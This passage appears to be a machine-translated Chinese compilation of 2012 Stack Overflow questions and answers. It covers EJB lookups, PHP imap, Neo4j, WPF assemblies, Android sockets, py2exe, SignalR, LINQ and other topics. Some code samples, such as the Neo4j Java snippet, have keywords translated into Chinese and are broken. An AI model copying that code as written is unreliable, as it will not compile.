[11/28/12 10:54:04:065 IST] 00000040 EJBContainerI I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatelessSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanLocal 接口myApp 应用程序。绑定位置为：ejblocal:myApp/ejb/test-ejb3.jar/EJB3StatelessSessionBean#com.app.test.ejb3.EJB3SessionBeanLocal
[11/28/12 10:54:04:066 IST] 00000040 AbstractEJBRu I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatelessSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanLocal 接口myApp 应用程序。绑定位置为：java:global/myApp/test-ejb3/EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanLocal

```

服务器 A 上的相同查找（使用提供程序 url：corbaloc:iiop:localhost:2809）有效。我还尝试使用“ejb/...”而不是“java:global/...”进行查找

# php - php imap_fetchmime 在 5.3.10 / 5.3.15 上错过了

> ID：13514019
> 
> 赞同：0
> 
> 时间：2012-11-22T13:43:18.970
> 
> 标签：php, imap

PHP imap_fetchmime 在我的 ubuntu 上的 PHP 5.3.10-1ubuntu3.4 和我的 Mac 上的带有 Suhosin-Patch 的 PHP 5.3.15 上不可用。

在[http://au1.php.net/manual/en/function.imap-fetchmime.php](http://au1.php.net/manual/en/function.imap-fetchmime.php)上，imap_fetchmime 可用（PHP 5 >= 5.3.6）

有人能知道原因吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T13:58:55.640

> 此扩展需要安装 c-client 库。[从ftp://ftp.cac.washington.edu/imap/](ftp://ftp.cac.washington.edu/imap/)获取最新版本并编译它。

[http://php.net/manual/en/imap.requirements.php](http://php.net/manual/en/imap.requirements.php)

您是否检查过（通过`phpinfo()`）是否启用了 IMAP 扩展？

# neo4j - Neo4j 中是否有类似于 mongodb 的 $inc 的增量方法？

> ID：13514025
> 
> 赞同：1
> 
> 时间：2012-11-22T13:43:42.527
> 
> 标签：neo4j

我在一个节点中有一个 points 属性，我想在每次玩家获得积分时增加它。由于可以同时进行多个更新，因此我希望进行增量更新查询以避免并发问题。例如，如果两个请求同时获取节点并且每个更新点+5，它将增加+5，而不是正确的+10。

我看到 github 中有一个与此相关的已关闭问题 #768，[https://github.com/neo4j/community/issues/768](https://github.com/neo4j/community/issues/768)，但除了实现乐观并发或单个之外，我没有看到其他答案在应用程序端排队。

如果乐观并发是答案，也许我可以利用数据库级别的某些东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T22:00:56.557

我找不到我提出的要求这个问题的 github 问题（github repo 已经移动。）但是，答案是这不会被添加到 REST API 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T15:01:03.820

您可以做的是在读取之前锁定节点，如下所示：

```
交易 tx = db.beginTx();
尝试
{
    tx.acquireWriteLock(myNode);
    int count = (Integer) myNode.getProperty("count", 0);
    myNode.setProperty("count", count + 5);
    tx.成功（）；
}
最后
{
    tx.finish();
}

```

# c# - 无法加载文件或程序集“System.Windows.Interactivity”

> ID：13514027
> 
> 赞同：22
> 
> 时间：2012-11-22T13:44:01.253
> 
> 标签：c#, .net, wpf, xaml, exception

我刚刚添加了 System.Windows.Interactivity 程序集。XamlParse 在运行时向我抛出异常：

> 无法加载文件或程序集“System.Windows.Interactivity，PublicKeyToken=31bf3856ad364e35”或其依赖项之一。该系统找不到指定的文件。

谷歌搜索只找到与棱镜相关的结果——我不使用。

知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-11-25T13:39:15.730

只是猜测，可能是您没有引用 MAIN 项目中的库。

它发生在我身上好几次了。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2015-08-10T21:06:08.500

Tilak 的回答帮了我很大的忙，但我还需要在 XAML 代码中从程序集“i”中**命名**至少一个元素。命名元素后，Visual Studio 会正确连接程序集。

改变

```
<i:InvokeCommandAction Command="{Binding MyCommand}"/> 
```

进入

```
<i:InvokeCommandAction Command="{Binding MyCommand}" x:Name="interactivityFix" /> 
```

只需对整个 XAML 文件中的一个元素执行此操作。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2015-07-24T10:49:14.123

有时，当您添加一个新库时，会引入一个冲突版本的`System.Windows.Interactivity.dll`.

这会阻止项目工作。

要解决此问题，请通过编辑您的内容来添加程序集绑定重定向，`app.config`使其看起来像这样：

```
<?xml version="1.0"?>
<configuration>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Windows.Interactivity"
                          publicKeyToken="31bf3856ad364e35"
                          culture="neutral"/>
        <bindingRedirect oldVersion="4.0.0.0"
                         newVersion="4.5.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <startup><supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/></startup>
  <appSettings>
    <add key="TestKey" value="true"/>
  </appSettings>
</configuration> 
```

不要担心更改`PublicKeyToken`，这在所有版本中都是不变的，因为它取决于 .dll 的名称，而不是版本。

确保您的`newVersion`in`appConfig`与您最终指向的实际版本相匹配：

[![在此处输入图像描述](../Images/4605d2ea76a9b24686c29d651907fbe7.png)](https://i.stack.imgur.com/wLT9g.png)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-11-22T15:52:58.460

您可以在 Blend SDK 中找到这个 dll。

下面是它的链接：

[http://www.microsoft.com/en-us/download/details.aspx?id=10801](http://www.microsoft.com/en-us/download/details.aspx?id=10801)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-11-18T09:31:49.590

您可以扫描每个项目的 System.Windows.Interactivity 版本，例如。4.0.0.0 或 4.5.0.0。此外，可能引用的第三方 dll 之一可能取决于 System.Windows.Interactivity。因此，请确保在整个项目中对齐版本。这必须解决您的问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-04-09T03:51:13.620

您可以检查项目属性 -> 构建 -> 输出路径。

使用 Windows 资源管理器转到输出路径导向器。然后查看该文件夹中是否存在“System.Windows.Interactivity.dll”。可能是因为 CopyLocal 标志为 false 或有原因 dll 文件未在输出路径文件夹中生成。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-12-20T22:09:35.443

这是今天早上的任务。我们的问题只是安装程序移动了 DLL 的位置。有时这不是一个微妙的版本不匹配：一个简单的错位会导致相同的迹象。您可以使用[Fuslogvw.exe](https://docs.microsoft.com/en-us/dotnet/framework/tools/fuslogvw-exe-assembly-binding-log-viewer)来帮助诊断。一旦您 (a) 记得使用 Admin privs 启动该工具并 (b) 配置该工具以向您显示绑定失败（“设置”），您将看到如下日志条目：

`LOG: DisplayName = System.Windows.Interactivity, PublicKeyToken=31bf3856ad364e35 (Partial) WRN: Partial binding information was supplied for an assembly: [ red herring, not a problem for us ] ... LOG: GAC Lookup was unsuccessful [ another red herring: System.Windows.Interactivity.dll is not a core assembly and not registered in the GAC by default ] LOG: Attempting download of new URL file:///C:/Program Files (x86)/<path>/System.Windows.Interactivity.DLL. ... LOG: All probing URLs attempted and failed.` 将 DLL 放在它所属的位置后，日志将如下所示： `LOG: GAC Lookup was unsuccessful. LOG: Attempting download of new URL file:///C:/Program Files (x86)/<path>/System.Windows.Interactivity.DLL. LOG: Assembly download was successful. Attempting setup of file: C:\Program Files (x86)\<path>\System.Windows.Interactivity.dll`

# android - 客户端如何等待可能的服务器消息？

> ID：13514029
> 
> 赞同：3
> 
> 时间：2012-11-22T13:44:13.573
> 
> 标签：android, sockets, client, inputstream

我是新手，如果我问愚蠢的问题，我很抱歉。
我必须与服务器建立套接字连接。
客户端（Android 设备）必须向服务器发送消息并等待确认消息。然后，如果服务器在 30 秒内没有收到来自客户端的任何消息，则发送一个 ack 消息请求。
我所做的是第一部分：客户端发送消息并读取响应。
我要问的是：客户端如何等待来自服务器的可能消息？
这是我写的代码：
在 onCreate 方法中：

```
Thread myThread = new Thread(new myRunnable());
myThread.start(); 
```

这是 myRunnable：

```
public class myRunnable implements Runnable{
  public void run(){
    try{
      Socket socket = new Socket(serverIp, serverPort);
      InputStream is = socket.getInputStream();
      OutputStream out = socket.getOutputStream();
      out.write(byteBuffer.array());
      out.flush();
      byte[] bbb = new byte[1024];
      // Receive message from server
      int bytesToRead= is.read(bbb);
      is.close();
      out.close();
      socket.close(); 
```

连续的读取操作返回 -1，那么我怎样才能等待服务器消息呢？
非常感谢您的任何建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:20:36.613

你不应该关闭流。当您关闭流时，您与服务器的通信将关闭。通常服务器通信发生在无限循环中。像这样的东西：

```
public class myRunnable implements Runnable{
  public void run(){
    try{
      Socket socket = new Socket(serverIp, serverPort);
      InputStream is = socket.getInputStream();
      OutputStream out = socket.getOutputStream();
      out.write(byteBuffer.array());
      out.flush();
      byte[] bbb = new byte[1024];
      while (true) {
         // Read next message.
         bytesToRead = is.read(bbb);
         // handle message...
         // If you need to stop communication use 'break' to exit loop;
      }
      is.close();
      out.close();
      socket.close(); 
```

因此线程停止在线`bytesToRead = is.read(bbb)`，直到服务器发送任何消息，之后它以您想要的任何方式处理消息并返回阅读下一条消息。如果您需要停止通信退出循环，请使用`break`.

# iphone - 图像在我的 iPhone 网站上的像素大小错误

> ID：13514030
> 
> 赞同：1
> 
> 时间：2012-11-22T13:44:14.997
> 
> 标签：iphone, pixel

我有一部 iPhone 4S，它的屏幕分辨率为 640x960px。我的问题是了解当我在浏览器中加载测试页面时像素会发生什么。

我的测试页面有一些 div 和一些图像： http: [//www.macverk.no/test-pixel-iphone.html](http://www.macverk.no/test-pixel-iphone.html)

当我得到 640 像素宽的屏幕截图时，我预计 320 像素宽的图像将覆盖一半的图像 - 但结果是 209 像素宽！

如果它是 160 像素宽，我可以更好地理解它，由于一些视网膜问题......但是 209？

一个朋友告诉我一些关于包括视口设置的事情，但后来我的 iPhone 就像是一个 320x480 像素的屏幕......

谁能帮忙？

# python - 具有多处理功能的 py2exe 无法运行进程

> ID：13514031
> 
> 赞同：8
> 
> 时间：2012-11-22T13:44:17.540
> 
> 标签：python, windows, multiprocessing, py2exe

我在 Windows 7 上使用 Python 2.6，我正在尝试使用多进程：

```
p = Process(target=f, args=(SOME_ARGS))
p.start()
p.join() 
```

虽然我从 CMD 运行代码（使用解释器）一切正常，但是在我使用 py2exe 创建 exe 文件后，进程的执行失败并出现以下错误：

**错误：没有这样的选项：--multiprocessing-fork**

我找到的所有解决方案都没有帮助。有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-12-18T13:05:43.443

`multiprocessing.freeze_support()`在将 Python 脚本打包成可执行文件以在 Windows 上使用时，您需要调用。这个电话应该`if __name__ == '__main__':`在实际调用之前`main()`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T14:27:47.213

您知道您使用的是 2008 年的应用程序吗？（py2exe），python在不断的实现，然后py2exe出现问题，我可以给你一个更好的解决方案...

您可以使用 cxfreeze：[http ://cx-freeze.sourceforge.net/](http://cx-freeze.sourceforge.net/)

简单、容易、良好和实现。

我希望这对你有所帮助。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-06-28T07:44:51.917

这是[一个很好的链接](http://japrogbits.blogspot.com/2010/03/multiprocessing-py2exe-and-windows.html)，它解释了如何冻结您的多处理程序以使其与 py2exe 一起工作：

也就是说，您需要在`multiprocessing.freeze_support()`调用 main 之后立即调用：

```
import multiprocessing

if __name__ == '__main__':
    multiprocessing.freeze_support() 
```

# extjs - Extjs - 高级搜索表单

> ID：13514032
> 
> 赞同：1
> 
> 时间：2012-11-22T13:44:17.600
> 
> 标签：extjs, extjs4, extjs4.1, extjs-mvc, advanced-search

我需要使用 Extjs 4 构建一个高级搜索表单，但我不确定从哪里开始。我通过互联网搜索了很多，但我没有找到一个明确的方法，甚至没有一个很好的例子。谁能帮我？

**编辑** 这是一个有许多文本字段作为条件的表单，用户可以输入至少一个搜索条件来进行搜索并获得与他输入的内容相关的结果。

**编辑 2** *希望能更好地描述目标*

我需要一个单独的过滤器面板，每行一个过滤器。过滤器由两个组合框组成：*字段选择*和*条件选择*以及至少可以是文本、数字、日期、...的值

最后一条过滤线下方将是一个加号按钮/组合，用于添加新过滤器

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T08:12:08.963

现在我明白你在找什么了。最接近的已经实现的解决方案： **[Ext.ux.grid.FiltersFeature](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.ux.grid.FiltersFeature)** *（而且这个也没有那么复杂）*。默认情况下，它只将它自己发布为 Column-Menu，我还没有找到类似的实现

![在此处输入图像描述](../Images/c13afda5dccd49d7bcd87d2434374f9e.png)

无论如何，如果它不适合您的需求，此功能将是您开始的最佳选择。用上面的视图扩展它。最好的事情是它已经提供了单独的过滤器类型，这使得以后可以轻松扩展。

您也可以尝试将您的示例解决方案移植到 ExtJS4，但我建议您继续使用您只需扩展的受支持的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T19:07:27.737

在您的左侧保留一个包含搜索条件的树面板，您想在其上搜索，保留一个中心面板，在此处单击节点，cms fr search aftr search replace centr panl with search results

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:27:33.033

您是否使用网格、组合框或其他来源进行搜索？这些 Ext 组件有一个**存储区**，您可以在其中**过滤**数据。

[组合框自动完成](http://docs.sencha.com/ext-js/4-1/#!/example/form/combos.html)或[网格列过滤](http://docs.sencha.com/ext-js/4-1/#!/example/grid-filtering/grid-filter-local.html)。

如果您需要其他内容，请在评论中告诉我。

# c# - 通过 ODBC 进行事务和多个查询

> ID：13514041
> 
> 赞同：1
> 
> 时间：2012-11-22T13:44:49.973
> 
> 标签：c#, sql-server-2008, tsql, odbc

我有一个接口，通过 ODBC 连接触发多个 SQL 查询。

这些查询创建函数、存储过程、执行存储过程等等。

如果其中一个失败，我希望开始一个完整的回滚。

`begin transaction`查询 a和 a的简单计划`commit transaction`导致 之后出现运行时错误`begin transaction`，因为此时没有触发任何提交。

是否有可能在一堆查询周围放置一个事务块？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:28:09.723

是的你可以。我假设您的意思是创建插入或更新类型的 sql 语句（不是选择查询）。在您进行此类操作之前，您应该记住仅当查询与您在查询之间设置的新数据没有关系时才在单个事务中运行查询。这是因为新数据尚未提交，因此您不能在下一条语句中使用 is。

这是一个使用事务运行一组命令的代码。

```
 /// <summary>
    /// Execute commands with an open SQL connection.
    /// Note: To execute a stored procedure send to useTransaction parameter false value
    /// </summary>
    /// <param name="connection">An opened SqlConnection</param>
    /// <param name="commands">A string array of the requested commands to execute</param>
    /// <param name="useTransaction">true if to force transaction, false to execute the commands without transaction</param>
    /// <returns>true for success, otherwise false</returns>
    public static bool ExecuteSqlCommands(SqlConnection connection, string[] commands, bool useTransaction)
    {
        bool bStatus = false;

        string[] lines = commands; // regex.Split(sql);

        SqlTransaction transaction = null;
        if (useTransaction)
            transaction = connection.BeginTransaction();
        using (SqlCommand cmd = connection.CreateCommand())
        {
            cmd.Connection = connection;
            if (useTransaction)
                cmd.Transaction = transaction;

            foreach (string line in lines)
            {
                if (line.Length > 0)
                {
                    cmd.CommandText = line;
                    cmd.CommandType = CommandType.Text;

                    try
                    {
                        cmd.ExecuteNonQuery();
                    }
                    catch (SqlException e)
                    {
                        string msg = e.Message;
                        if (useTransaction)
                            transaction.Rollback();
                        throw;
                    }
                }
            }
            bStatus = true;
        }
        if (bStatus && useTransaction)
            transaction.Commit();

        return bStatus;
    } 
```

# asp.net - SignalR 1.0alpha2 控制台服务器应用程序

> ID：13514052
> 
> 赞同：3
> 
> 时间：2012-11-22T13:45:13.050
> 
> 标签：asp.net, nuget, signalr

我正在玩signalR 的新1.0alpha2 版本。我想在 ASP.NET 应用程序之外实现 SignalR 服务器。这样两个控制台应用程序就可以相互通信。

使用旧的 0.5.3 版本，我能够“Install-Package SignalR.Hosting.Self”到：

```
var server = new Server("http://127.0.0.1:8088/"); 
```

但是在新的 1.0alpha2 版本中，我无法安装这个 NuGet 包......

谁能给我一个链接或两个基于**1.0alpha2**版本的控制台应用程序的工作迷你示例。（我只能找到不工作的旧 0.5.3 示例......）。

* * *

行。所以我听从了你的指示。现在：

我的客户端控制台：

```
class Programm 
{
  static void Main(string[] args) 
  {
    var connection = new HubConnection("http://localhost/");
    IHubProxy myHub = connection.CreateHubProxy("MyHub");
    connection.Start().ContinueWith(task =>
      {
          if (task.IsFaulted)
              Console.WriteLine("No Connection: " + task.Exception.GetBaseException());
          else
              Console.WriteLine("Connected!");
      });

    myHub.Invoke("Send");

    Console.ReadLine(); // wait...
  }
} 
```

这是我的服务器控制台：

```
class Program : Hub
{
  static void Main(string[] args)
  {
      Console.ReadKey();
  }
  public void Send(string message)
  {
      Debug.WriteLine("Server Method [send] was called");
      Console.WriteLine("Server Method [send] was called");
  }
} 
```

但我认为这是胡说八道......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T13:52:51.953

自从 SignalR 正式发布以来，您需要使用新的 NuGet 包：（说是 ASP，但它也用于 .NET 应用程序）

`Install-Package Microsoft.AspNet.SignalR -pre`服务器

`Install-Package -pre Microsoft.AspNet.SignalR.Client`客户

这里还有一个预构建的示例应用程序，然后您可以将控制台应用程序连接到其中进行一些测试：

`Install-Package Microsoft.AspNet.SignalR.Sample`

使用客户端；连接两个控制台应用程序，一个需要托管集线器，另一个需要使用指向主机的客户端连接。

您需要的所有信息都在此客户端 wiki 中：[链接](https://github.com/SignalR/SignalR/wiki/SignalR-Client-Hubs)

* * *

***编辑***

服务器：（使用自主机）

```
class Program
{
    static void Main(string[] args)
    {
        string url = "http://localhost:8081/";
        var server = new Server(url);

        // Map the default hub url (/signalr)
        server.MapHubs();

        // Start the server
        server.Start();

        Console.WriteLine("Server running on {0}", url);

        // Keep going until somebody hits 'x'
        while (true)
        {
            ConsoleKeyInfo ki = Console.ReadKey(true);
            if (ki.Key == ConsoleKey.X)
            {
                break;
            }
        }
    }

    public class MyHub : Hub
    {
        public void Send(string message)
        {
            Clients.All.addMessage(message);

        }
    }

} 
```

客户：

```
class Program
{
    static void Main(string[] args)
    {
        var connection = new HubConnection("http://localhost:8081/");

        IHubProxy proxy = connection.CreateHubProxy("MyHub");

        connection.Start().Wait();

        proxy.On("addMessage", data => { Console.WriteLine("From Server: " + data); });

        while (true)
        {
            proxy.Invoke("Send", Console.ReadLine());
        }

    }
} 
```

![在此处输入图像描述](../Images/c112354f29826591a78f4b93d51ed3f2.png)

PS。生病在下面的评论中将下载添加到这两个解决方案中。我相信你会没事的。

# macos - Aquamacs 中的莫斯科 ML

> ID：13514057
> 
> 赞同：0
> 
> 时间：2012-11-22T13:45:26.140
> 
> 标签：macos, sml, aquamacs

你们中的任何一个 mac 用户都知道如何让莫斯科 ML (mosml) 在 aquamacs 中工作吗？我已经通过 macports 安装了 mosml，它正在终端中工作。我还在 Aquamacs 中安装了 Sml 模式，但无法编译我的活动 SML 文件。谁知道导游？或为此工作的替代编辑器？

谢谢，。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-14T22:33:15.063

实际上这不是一个错误......只是我有点愚蠢:)..当尝试使用 emacs 命令在 aquamacs 中编译 sml 文件时，它的 mosml 编译器的 cd 路径错误. 我把它改成了正确的，现在它可以工作了

# actionscript-3 - Flash 影片在 Control+Enter 预览期间工作正常，但在发布后无法正常工作

> ID：13514058
> 
> 赞同：2
> 
> 时间：2012-11-22T13:45:27.727
> 
> 标签：actionscript-3, flash, flash-cs6

我正在尝试将 flowplayer 嵌入到 Flash 中。当我使用 control+enter 预览测试它时，我能够成功地做到这一点，并且所有配置设置都运行良好。但是在我将它发布到 swf/html 之后，播放器就不再工作了。我是从[这篇](http://webcache.googleusercontent.com/search?q=cache%3aflash.flowplayer.org/forum/1/10890#post-44115&oq=cache%3aflash.flowplayer.org/forum/1/10890#post-44115&aqs=chrome.0.57j58j61j60l2.3478&sugexp=chrome,mod=17&sourceid=chrome&ie=UTF-8)文章开始的。如果有人可以帮助我解决这个问题，那就太好了。

提前致谢

编辑：我正在附加我的项目的源文件。请让我知道它是否适合您，或者您是否可以发现代码中的错误。dropbox.com/s/jn8dkzqu1w7px5n/flowplayer.rar

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-30T06:52:00.103

我检查了你的代码。它对我来说工作正常。请按照以下步骤设置您的开发环境：

1.  为您的浏览器安装调试播放器和非调试播放器
2.  然后在使用 flash ide 和发布设置发布您的应用程序后，必须检查 html。（因此，您将在发布应用程序后获得 HTML 文件。）
3.  运行发布时由 Flash IDE 生成的 HTML 文件。

如果您仍然遇到一些错误，那么您可以检查设置管理器配置并且您必须添加您的 swf 文件。

在最后一种情况下，您必须将您的应用程序放在任何本地或公共服务器中，然后您必须从那里通过发布期间生成的 html 页面运行。

# c# - 如何在 Windows Phone 后台运行应用程序？

> ID：13514064
> 
> 赞同：9
> 
> 时间：2012-11-22T13:45:47.840
> 
> 标签：c#, windows-phone-7, windows-phone-8

我想在 Windows Phone 8 中开发一个后台应用程序。就像有一个闪屏，闪屏启动后，它会立即移到后台。

但是应用程序中存在的计时器应该在后台处于活动状态并继续执行分配的任务。因此，在前台用户可以继续使用设备，而在后台应用程序将运行计时器并继续执行任务。

我曾尝试使用定期任务，但它们会在 30 分钟或更长时间内触发一次。但我希望这个应用程序在 20 秒内触发一次。

请帮助我一些想法。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-22T22:33:51.907

WP7/WP8 不允许在后台对任意应用程序进行完整的多任务处理。无论您要完成的是什么，都必须以其他方式实现，或者只是不在 Windows Phone 上完成。您发现了很多替代方案：WP7.5[警报和提醒](http://msdn.microsoft.com/en-us/library/windowsphone/develop/hh202965%28v=vs.105%29.aspx)、WP7[计划磁贴更新](http://msdn.microsoft.com/en-us/library/windowsphone/develop/ff769548%28v=vs.105%29.aspx)、WP7.5[定期后台代理、资源密集型后台代理](http://msdn.microsoft.com/en-us/library/windowsphone/develop/hh202942%28v=vs.105%29.aspx)、WP8[地理位置跟踪应用程序](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj662935%28v=vs.105%29.aspx)、WP7[推送通知](http://msdn.microsoft.com/en-us/library/windowsphone/develop/ff402558%28v=vs.105%29.aspx)等。

WP7/8 Multitasking 的禅意是从电池、内存使用和其他资源的角度保持手机健康。所以，没有完整的后台多任务处理。尽管 WP8 通过[Geolocation 跟踪应用程序](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj662935%28v=vs.105%29.aspx)和[Fast Application Resume](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj735579%28v=vs.105%29.aspx)进行了改进。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T12:55:51.080

Windows Phone 支持单个 MainApplication 视图和后台代理。如果您想做任何像“屏幕录制”这样的应用程序，由于安全原因和电池原因，这是不可能的。但是，如果您能够制作自己的 Web 服务，那么通过 Streaming 代理通过流式传输数据应该很容易捕捉到这种情况。

这里有一些代理样本。

[![频道 9](../Images/3548fc7afc36341bb99550f836c2b3ff.png)](http://channel9.msdn.com/Series/Kurs-programowania-Windows-Phone-pisz-na-Mango/Background-Transfer-Service--Kurs-Windows-Phone-7-pisz-na-Mango-cz-4)

[Microsoft.Phone.BackgroundTransfer 命名空间](http://msdn.microsoft.com/en-us/library/windowsphone/develop/microsoft.phone.backgroundtransfer%28v=vs.105%29.aspx)

[将 Windows Phone 后台代理添加到 XNA 游戏](http://msdn.microsoft.com/en-us/library/hh205609.aspx)

[Windows Phone 7 后台代理 (CSWP7ScheduledTaskAgent)](http://code.msdn.microsoft.com/wpapps/CSWP7ScheduledTaskAgent-6450bcf1)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-27T04:09:22.830

例如：[https ://code.msdn.microsoft.com/windowsapps/Background-sensors-eb7bb176](https://code.msdn.microsoft.com/windowsapps/Background-sensors-eb7bb176)

您需要从模板“Windows 运行时组件”创建一个新项目

对不起我的英语。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-10-27T21:08:09.990

您可以启用或禁用应用程序在后台运行：

去`Settings > battery saver > usage > tap on application > On/Off Background`

默认情况下，很少有应用程序总是可以在后台运行，对于这些应用程序，它已被禁用，例如 Phone、FB Messenger 等。如果您真的觉得应该在后台运行，最好将其卸载。

希望能帮助到你。

# jboss - log4j 属性文件未从战争文件中提取

> ID：13514065
> 
> 赞同：0
> 
> 时间：2012-11-22T13:45:59.710
> 
> 标签：jboss, log4j, portlet, jsr

我已经创建了一个 web 应用程序并部署在 jboss 服务器中。

我将 log4j.properties 文件放在 WEB-INF/classes 文件夹中。但不是使用我的应用程序特定的 log4j.properties，而是使用默认的 log4j.properties 并在 server.log 中打印日志。

我什么时候需要放置要提取的 log4j.properties？我的war 文件是一个JSR portlet，所以我不能使用静态方法来读取属性文件。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T16:22:32.653

为 jboss 4.2 设置自己的 log4j 的 3 步指南

1：将你`log4j.properties`放在你的 WAR/EAR 的类路径上

2：将你`log4j.jar`的放在你的类路径中

3：隔离类加载器`jboss-web.xml`用于将您的 jar 副本用于您的应用程序

有关详细步骤，请参阅本文：[如何使用自定义 log4j](http://planet.jboss.org/post/how_do_i_use_my_own_log4j_properties_or_xml_file_in_jboss)

# c# - .NET - 按内部列表 SUM 排序列表

> ID：13514070
> 
> 赞同：2
> 
> 时间：2012-11-22T13:46:17.027
> 
> 标签：c#, .net, linq

在解决这个问题时遇到了一些麻烦，我有一个我在 LINQ 中按帐户分组的交易列表，现在它给了我一个所有帐户的可枚举，每个帐户都有一个可枚举的交易。我现在想获取该列表，并按每个组的事务总和对其进行排序，但它似乎不起作用，这是我到目前为止所拥有的：

```
var memberTrans = trans.GroupBy(o => o.ShareAccountId);
var transOrdered = memberTrans.OrderByDescending(o => o.Sum(i => i.TransactionAmount)); 
```

我的想法是，我可以做 .First() 并获得在此期间净增长最高的帐户，并 .Last() 获得净增长最低的帐户。

假设我有如下数据（简化）

*   账户 1：300
*   账户 1：-300
*   账户 2：100
*   账户 3 : 50
*   账户 2：-20

所以第一个分组给了我：

账户 1：

*   转：300
*   转：-300

账户 2：

*   转：100
*   转：-20

账户 3：

*   转：50

现在我想按每个组内交易的总和对其进行排序，所以我们有一个列表：

账户 2：

*   转：100
*   转：-20

账户 3：

*   转：50

账户 1：

*   转：300
*   转：-300

希望这足够清楚，非常感谢任何帮助！

编辑：为了清楚起见，更多代码：

`var tranOrder = trans.GroupBy(o => o.ShareAccountId).OrderByDescending(g => g.Sum(t => t.TransactionAmount));`

 ````
 var bigUp = tranOrder.First().First();
        var bigDown = tranOrder.Last().First(); 
        report.BiggestMovementUp = tranOrder.First().Sum(o => o.TransactionAmount);
        report.BiggestMoverUp =
            (bigUp.Member.Title + " " + bigUp.Member.Forename + " " + bigUp.Member.Surname + " - ID " + bigUp.Member.MemberID).Trim();
        report.BiggestMovementDown = tranOrder.Last().Sum(o => o.TransactionAmount);
        report.BiggestMoverDown =
          (bigDown.Member.Title + " " + bigDown.Member.Forename + " " + bigDown.Member.Surname + " - ID " + bigDown.Member.MemberID).Trim(); 
````  `* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T13:52:34.283

```
 var v = (from acc in accs
           group acc by acc.ShareAccountId into g
           orderby g.Sum(x => x.TransactionAmount) descending
           select g.Sum(x => x.TransactionAmount)); 
```

应该这样做，您可以在选择中做任何您想做的事情。我也测试过这个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:00:39.833

这个怎么样：

```
internal class Program
    {
        private class AccountOperation
        {
            public int Id { get; set; }
            public int Amount { get; set; }
        }

        private static void Main(string[] args)
        {
            List<AccountOperation> ops = new List<AccountOperation>
            {
                new AccountOperation { Id = 1, Amount = 300},
                new AccountOperation { Id = 1, Amount = -300},
                new AccountOperation { Id = 2, Amount = 100},
                new AccountOperation { Id = 3, Amount = 50},
                new AccountOperation { Id = 2, Amount = -20},
            };

            foreach (var operationsByAccount in ops
                .OrderByDescending(z => z.Amount)  // Orders all amounts descending
                .GroupBy(z => z.Id) // Groups by account ID
                .OrderByDescending(z => z.Sum(z2 => z2.Amount))) // Orders groups of operations per accounts descending (by sum of amounts)
            {
                Console.WriteLine("Operation " + operationsByAccount.Key);
                foreach (var operation in operationsByAccount)
                {
                    Console.WriteLine("\tAmout " + operation.Amount);
                }
            }

            Console.ReadLine();
        }
    } 
```

输出：

*   操作 2
    *   大约 100
    *   金额 -20
*   操作 3
    *   大约 50
*   操作 1
    *   大约 300
    *   金额 -300

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T15:33:24.923

对于您的方法链接版本的修复：

```
var v = accs.GroupBy(acc => acc.ShareAccountId)
        .OrderByDescending(g => g.Sum(x => x.TransactionAmount))
        .Select( g => g.Sum(x => x.TransactionAmount)); 
```

诚然，我让 Resharper 从 LINQ 语法中为我做这件事 :)`

# ruby-on-rails-3 - 具有多个的过滤器模型具有多个通过

> ID：13514073
> 
> 赞同：0
> 
> 时间：2012-11-22T13:46:27.767
> 
> 标签：ruby-on-rails-3

给定

文档：

```
has_many :shares
has_many :groups, :through => :shares 
```

用户：

```
has_many :memberships
has_many :groups, :through => :memberships 
```

团体：

```
has_many :memberships
has_many :users, :through => :memberships

has_many :shares
has_many :documents, :through => :shares 
```

我只需要显示给定用户实例 current_user 的文档。

`@documents = current_user.groups.documents`不削减它。

我如何才能过滤到仅与用户至少有一个共同组的文档？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:40:58.293

您可以使用单个查询来执行此操作：

```
